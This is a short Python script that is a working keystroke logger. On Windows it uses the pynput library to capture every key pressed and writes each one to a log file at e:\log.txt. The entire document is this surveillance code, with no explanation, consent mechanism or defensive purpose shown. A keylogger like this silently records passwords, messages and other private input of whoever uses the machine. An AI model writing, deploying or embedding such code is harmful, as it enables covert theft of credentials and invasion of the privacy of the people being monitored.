from pynput.keyboard import Key, Listener
import sys
import logging
import platform



if platform.system() == "Windows":
    log = "e:\\log.txt"
    logging.basicConfig(filename=log, level=logging.DEBUG, format='%(message)s')
    def on_press(key):
        logging.info(key)
    with Listener(on_press=on_press) as listener:
        listener.join()